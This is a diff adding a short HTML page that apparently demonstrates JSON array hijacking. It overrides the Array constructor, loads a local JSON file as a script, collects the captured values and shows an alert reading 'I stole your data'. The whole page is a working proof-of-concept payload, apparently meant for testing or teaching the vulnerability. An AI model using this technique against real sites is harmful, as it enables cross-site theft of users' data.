@@ -1,0 +1,23 @@
+<html>
+<head>
+<script type="text/javascript">
+secrets = null;
+
+Array = function() {
+  secrets = this;
+};
+</script>
+<script src="../data/vuln-array.json" type="text/javascript"></script>
+<script type="text/javascript">
+
+  var yourData = '';
+  var i = -1;
+  while ( secrets[++i] ) {
+    yourData += secrets[i] + ' ';
+  }
+
+  alert('I stole your data: ' + yourData);
+</script>
+</head>
+<body></body>
+</html>
